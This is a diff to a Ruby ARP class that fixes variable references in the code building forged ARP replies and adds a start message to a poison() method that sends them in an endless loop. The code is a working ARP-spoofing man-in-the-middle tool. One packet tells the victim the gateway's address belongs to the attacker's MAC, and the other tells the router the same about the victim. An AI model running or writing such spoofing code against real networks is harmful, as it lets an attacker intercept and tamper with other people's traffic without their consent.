@@ -33,11 +33,11 @@ class ARP
         # Make the victim response packet
         
         #link layer components
-        @v_packet.eth_saddr = ifconfig[:eth_saddr]       # attacker MAC address
+        @v_packet.eth_saddr = @ifconfig[:eth_saddr]       # attacker MAC address
         @v_packet.eth_daddr = victim_mac                 # the victim's MAC address
         #arp components
         
-        @v_packet.arp_saddr_mac = ifconfig[:eth_saddr]
+        @v_packet.arp_saddr_mac = @ifconfig[:eth_saddr]
         @v_packet.arp_daddr_mac = victim_mac
         @v_packet.arp_saddr_ip = gateway
         @v_packet.arp_daddr_ip = victim_ip
@@ -46,10 +46,10 @@ class ARP
         #Make the router response packet
         
         #link layer components
-        @r_packet.eth_saddr = cfg[:eth_saddr]
+        @r_packet.eth_saddr = @ifconfig[:eth_saddr]
         @r_packet.eth_daddr = router_mac
         #arp components
-        @r_packet.arp_saddr_mac = cfg[:eth_saddr]
+        @r_packet.arp_saddr_mac = @ifconfig[:eth_saddr]
         @r_packet.arp_daddr_mac = router_mac
         @r_packet.arp_saddr_ip = victim_ip
         @r_packet.arp_daddr_ip = gateway
@@ -64,6 +64,7 @@ class ARP
 	#
 	# ============================================================================================	
 	def poison()
+	        puts "ARP Poisining started..."
 		     while true do
 		     	@v_packet.to_w(@ifname)
 		     	@r_packet.to_w(@ifname)
